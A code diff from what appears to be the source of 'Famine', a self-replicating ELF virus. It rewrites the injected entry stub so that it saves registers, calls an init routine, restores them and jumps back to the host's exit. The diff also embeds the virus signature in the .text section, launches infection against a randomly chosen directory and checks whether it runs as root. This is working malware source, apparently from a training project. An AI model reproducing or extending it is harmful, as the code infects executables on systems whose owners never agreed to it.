@@ -4,67 +4,55 @@
 /// BOOTSTRAP FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-static void init(void);
-
 int main(void)
 {
 	__entry();
 }
 
-////////////////////////////////////////////////////////////////////////////////
-/// PUBLIC FUNCTION
-////////////////////////////////////////////////////////////////////////////////
-
 void __entry(void)
 {
-	__asm__ volatile (
-			"push rbx\n"
-			"push rsp\n"
-			"push rbp\n"
-			"push rax\n"
-			"push rdi\n"
-			"push rsi\n"
-			"push rdx\n"
-			"push rcx\n"
-			"push r8\n"
-			"push r9\n"
-			"push r10\n"
-			"push r11\n"
-			"push r12\n"
-			"push r13\n"
-			"push r14\n"
-			"push r15\n"
-			);
-
-	init();
-
-	__asm__ volatile (
-			"pop r15\n"
-			"pop r14\n"
-			"pop r13\n"
-			"pop r12\n"
-			"pop r11\n"
-			"pop r10\n"
-			"pop r9\n"
-			"pop r8\n"
-			"pop rcx\n"
-			"pop rdx\n"
-			"pop rsi\n"
-			"pop rdi\n"
-			"pop rax\n"
-			"pop rbp\n"
-			"pop rsp\n"
-			"pop rbx\n"
-			);
-
-	__asm__ volatile (
-			"add rsp, 8\n"
-			"jmp Exit\n"
-			);
+	__asm__ volatile
+	(
+		"push rbx\n"
+		"push rsp\n"
+		"push rbp\n"
+		"push rax\n"
+		"push rdi\n"
+		"push rsi\n"
+		"push rdx\n"
+		"push rcx\n"
+		"push r8\n"
+		"push r9\n"
+		"push r10\n"
+		"push r11\n"
+		"push r12\n"
+		"push r13\n"
+		"push r14\n"
+		"push r15\n"
+		"call init\n"
+		"pop r15\n"
+		"pop r14\n"
+		"pop r13\n"
+		"pop r12\n"
+		"pop r11\n"
+		"pop r10\n"
+		"pop r9\n"
+		"pop r8\n"
+		"pop rcx\n"
+		"pop rdx\n"
+		"pop rsi\n"
+		"pop rdi\n"
+		"pop rax\n"
+		"pop rbp\n"
+		"pop rsp\n"
+		"pop rbx\n"
+		"add rsp, 8\n"
+		"jmp _fatal\n"
+	);
 }
 
 ////////////////////////////////////////////////////////////////////////////////
-/// STATIC FUNCTIONS
+/// STATIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
 static void launch(struct directory *dir, const size_t size)
@@ -80,7 +68,13 @@ static void launch(struct directory *dir, const size_t size)
 	famine(dir[_get_random_integer(size)].path);
 }
 
-static void init(void)
+////////////////////////////////////////////////////////////////////////////////
+/// PUBLIC FUNCTION
+////////////////////////////////////////////////////////////////////////////////
+
+const char hello[] __attribute__((section(".text#"), aligned(1))) = "Famine version 1.0 (c)oded by <jle-quel><ddinaut>\n";
+
+void init(void)
 {
 	if (_getuid() == 0)
 	{
